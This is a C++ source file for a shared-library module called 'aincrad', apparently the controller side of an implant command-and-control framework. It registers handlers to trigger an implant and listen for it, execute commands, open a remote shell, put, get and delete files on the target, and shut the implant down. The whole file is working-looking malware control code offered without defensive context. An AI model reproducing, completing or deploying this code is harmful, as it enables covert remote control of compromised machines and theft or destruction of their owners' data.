#include <iostream>
#include <pthread.h>
#include <stdlib.h>
#include "LibraryModuleBase.h"
#include "Primitive.h"
#include "CustomCommand.h"
#include "Ilm.h"
#include "File.h"
#include "Command.h"
#include "Connection.h"
#include "Utilities.h"
#include "ilm-client.h"
#include "aincrad.h"
 
extern "C"
{
#include "debug.h"
#include "proj_strings_main.h"
#include "crypto_strings_main.h"
}
 
using namespace InterfaceLibrary;
using namespace InterfaceLibrary::Primitive;
 
/// These definitions simply make the extracted function documentation in this module more readable.
#define CONSTRUCT_DECL void __attribute__ ((constructor))
#define DESTRUCT_DECL void __attribute__ ((destructor))
 
LibraryModuleBase	*myILMInstance;
Ilm::Listener		*myListener;
Ilm::Trigger		*myTrigger;
Connection			*myConn;
 
void ListenWrapper(Primitive::Activation& actvn, ProcessCmdAccumulator& acc, ProcessCmdResponse& resp)
{
	myListener->Listen( actvn, acc, resp);
}
 
void TriggerWrapper(Primitive::Activation& actvn, ProcessCmdAccumulator& acc, ProcessCmdResponse& resp)
{
	myTrigger->triggerImplant( actvn, acc, resp);
}
 
void TriggerListenWrapper(Primitive::Activation& actvn, ProcessCmdAccumulator& acc, ProcessCmdResponse& resp)
{
//	myTrigger->triggerImplantAndListen( actvn, acc, resp);
	myListener->TriggerAndListen( actvn, acc, resp);
}
 
/*==========================================================================*/
 
/// ILM shared object constructor used to initialize the ILM.  It's called
/// automatically as the shared object is linked by the first executable object.
/// The ILM developer should place any necessary global initialization actions
/// in this function.
//CONSTRUCT_DECL ILMConstructor()
aincradILM::aincradILM()
{
	init_strings();
	init_crypto_strings();
 
	srand((unsigned int)time(NULL));
 
	//Instantiate the Trigger+Listener (i.e. Connect)...
	primitiveRefTable[0x03000002]->handler = TriggerListenWrapper;
	primitiveRefTable[0x03000002]->currentlySupported = true;
 
	//Instantiate the Listener...
	primitiveRefTable[0x03000003]->handler = ListenWrapper;
	primitiveRefTable[0x03000003]->currentlySupported = true;
 
	//Instantiate the Trigger...
//	primitiveRefTable[0x03000004]->handler = TriggerWrapper;
	primitiveRefTable[0x03000004]->handler = TriggerWrapper;
	primitiveRefTable[0x03000004]->currentlySupported = true;
 
	// none of these functions should be available until the client has a connection with the server
	// these are set to true in Ilm::Listen()
	//Good
	primitiveRefTable[0x08000003]->handler = Command::Execute;
	primitiveRefTable[0x08000003]->currentlySupported = false;
 
	primitiveRefTable[0x08000004]->handler = Command::Session;
	primitiveRefTable[0x08000004]->currentlySupported = false;
 
	primitiveRefTable[0x03000008]->handler = Command::Exit;
	primitiveRefTable[0x03000008]->currentlySupported = false;
 
	primitiveRefTable[0x02000003]->handler = File::Put;
	primitiveRefTable[0x02000003]->currentlySupported = false;
 
	primitiveRefTable[0x02000009]->handler = File::Get;
	primitiveRefTable[0x02000009]->currentlySupported = false;
 
	primitiveRefTable[0x02000005]->handler = File::Delete;
	primitiveRefTable[0x02000005]->currentlySupported = false;
 
	// prep the custom commands
	cGroup.setTitle("shutdown");
	cGroup_shell.setTitle("shell");
}
 
aincradILM::~aincradILM()
{
   //cout << "\n\nWho will delete aincrad's Listener and Trigger?   ...\n" << endl;
   //delete &myListener;
}
 
 
void aincradILM::RemoveCustomCmds( void )
{
	RemoveCmdShutDown();
	RemoveCmdShell();
}
 
void aincradILM::AddCustomCmds( void )
{
	AddCmdShutDown();
	AddCmdShell();
}
 
void aincradILM::RemoveCmdShutDown( void )
{
//	cout << " * RemoveCmdShutDown()" << endl;
	cGroup.Remove( 33 );
	return;
}
 
void aincradILM::AddCmdShutDown( void )
{
//	cout << " * AddCmdShutDown()" << endl;
	cGroup.push_back( shutdownCmd2 );
	customCommands.push_back( cGroup );
	return;
}
 
void aincradILM::RemoveCmdShell( void )
{
	cGroup_shell.Remove( 34 );
	return;
}
 
void aincradILM::AddCmdShell( void )
{
	cGroup_shell.push_back( trueshell );
	customCommands.push_back( cGroup_shell );
	return;
}
//****************************************************************************
//****************************************************************************
 
CONSTRUCT_DECL ILMConstructor()
{
//	LibraryModuleBase * myILMInstance = new aincradILM();
	myILMInstance = new aincradILM();
	myTrigger = new Ilm::Trigger();
	myListener = new Ilm::Listener();
	myConn = myListener->getConnection();
	(void) myILMInstance;
}
 
/// ILM shared object destructor gets rid of stuff created in ILMConstructor.
/// It's called automatically as the shared object is unlinked by the last
/// executable object.
DESTRUCT_DECL ILMDestructor()
{
	delete LibraryModuleBase::GetHandlerObject();
}